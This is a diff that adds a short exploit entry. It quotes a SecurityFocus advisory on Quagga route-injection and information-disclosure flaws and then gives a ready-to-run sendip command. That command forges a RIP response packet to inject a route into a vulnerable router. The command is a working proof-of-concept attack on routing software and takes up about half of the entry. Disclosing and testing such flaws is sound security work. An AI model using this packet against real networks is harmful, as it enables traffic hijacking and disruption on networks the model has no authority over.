@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/17808/info
+ 
+Quagga is susceptible to remote information-disclosure and route-injection vulnerabilities. The application fails to properly ensure that required authentication and protocol configuration options are enforced.
+ 
+These issues allow remote attackers to gain access to potentially sensitive network-routing configuration information and to inject arbitrary routes into the RIP routing table. This may aid malicious users in further attacks against targeted networks.
+ 
+Quagga versions 0.98.5 and 0.99.3 are vulnerable to these issues; other versions may also be affected.
+
+sendip -p ipv4 -is 192.168.69.102 -p udp -us 520 -ud 520 -p rip -rv 1 -rc 2 -re 2:0:192.168.36.0:255.255.255.0:0.0.0.0:1 192.168.69.100
